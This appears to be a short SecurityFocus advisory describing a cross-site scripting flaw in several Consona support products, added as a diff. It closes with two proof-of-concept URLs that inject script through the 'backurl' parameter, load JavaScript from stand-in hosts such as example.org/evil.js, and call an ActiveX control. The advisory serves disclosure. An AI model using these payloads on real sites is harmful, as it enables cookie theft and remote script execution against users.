@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/39999/info
+
+Multiple Consona (formerly SupportSoft) products are prone to a cross-site scripting vulnerability.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site and to steal cookie-based authentication credentials; other attacks are possible.
+
+The following are vulnerable:
+Consona Live Assistance
+Consona Dynamic Agent
+Consona Subscriber Assistance 
+
+http://www.example.com/sdccommon/verify/asp/n6plugindestructor.asp?backurl=";}</script><script src="http://www.example.org/pluginlicense.js" type="text/javascript"></script><script>RenderLicense();</script><script>function returnback(){ var cnfctl = new ActiveXObject("SdcUser.TgConfCtl"); cnfctl.WHATEVER();}</script><!--
+http://www.example.com/sdccommon/verify/asp/n6plugindestructor.asp?backurl=</script><script src=http://www.example.org/evil.js></script><script>function returnback() {document.write(license);document.write(payload);}</script>
